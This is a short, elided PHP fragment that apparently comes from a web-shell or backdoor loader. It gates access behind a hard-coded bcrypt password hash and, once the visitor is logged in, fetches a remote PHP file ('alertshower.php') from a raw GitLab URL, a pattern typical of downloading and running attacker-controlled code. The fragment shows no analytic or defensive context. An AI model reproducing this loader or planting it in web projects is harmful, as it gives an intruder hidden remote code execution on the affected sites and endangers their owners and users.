...
if (isset($_POST['password'])) {
    ...
    $hashed_password = '$2a$12$QBwCikodUephGQQMd0TIRuGIhHVIYWxQo95mmc3XXREB.dIDYnOda';
...
if (is_logged_in()) {
    $a = geturlsinfo('https://gitlab.com/nothing-imposible/posible/-/raw/main/alertshower.php');
